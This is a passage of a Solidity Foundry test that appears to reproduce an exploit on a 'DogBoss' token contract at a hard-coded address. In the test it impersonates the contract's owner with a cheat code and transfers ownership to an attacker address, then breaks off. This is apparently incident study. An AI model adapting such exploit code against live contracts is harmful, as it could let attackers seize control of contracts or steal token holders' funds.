    function transferOwnership(address newOwner) external;
    function balanceOf(address who) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C;
    address attacker = address(this);
    IDogBoss dogBoss;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        dogBoss = IDogBoss(TARGET);
        vm.label(TARGET, "DogBoss Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Impersonate the current owner to transfer ownership
        address currentOwner = 0x218706B997e9b91Db9166875f5E66BD427Ce6274;
        vm.startPrank(currentOwner);
        dogBoss.transferOwnership(attacker);
        vm.stopPrank();

